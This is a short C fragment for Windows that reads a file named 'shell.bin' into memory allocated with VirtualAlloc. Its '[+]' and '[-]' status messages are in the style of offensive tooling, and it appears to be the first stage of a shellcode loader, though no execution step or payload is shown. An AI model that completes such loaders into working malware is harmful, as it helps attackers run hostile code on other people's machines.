	HANDLE hfile = CreateFile(L"shell.bin", GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	SIZE_T hfileSize = GetFileSize(hfile, NULL);
	PVOID vac = VirtualAlloc(NULL, hfileSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	DWORD lpNumberOfBytesRead = 0;
	if (!ReadFile(hfile, vac, hfileSize, &lpNumberOfBytesRead, NULL)) {
		printf("[-] Failed reading file. Exiting with error code: %d\n", GetLastError());
		VirtualFree(vac, 0, MEM_DECOMMIT | MEM_RELEASE);
		CloseHandle(hfile);
		return 1;
	}
	printf("[+] Success reading %d of the file at %p.\n", lpNumberOfBytesRead, vac);
	CloseHandle(hfile);
